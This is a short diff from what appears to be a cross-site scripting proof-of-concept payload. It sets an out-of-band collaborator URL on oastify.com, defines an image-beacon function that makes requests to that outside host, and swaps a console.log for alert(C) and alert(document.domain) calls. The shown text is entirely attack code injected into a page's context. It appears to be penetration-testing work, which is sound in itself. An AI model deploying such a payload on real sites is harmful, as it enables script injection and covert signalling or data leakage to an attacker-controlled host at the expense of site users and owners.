@@ -5,7 +5,8 @@
   if (window.__poc014) { return; } window.__poc014 = 1;   // reflected twice; run once
   var d = document, O = d.domain;
   var C = 'https://cl1xu7hi3pk8m35w5imazf105rbiz9ny.oastify.com';   // <-- the collaborator YOU watch
-   console.log(C);
+   alert(C);
+   alert(document.domain);
   var KEEP = [];
   function beacon(path) {
     try { var im = new Image(); KEEP.push(im); im.src = C + path; } catch (e) {}
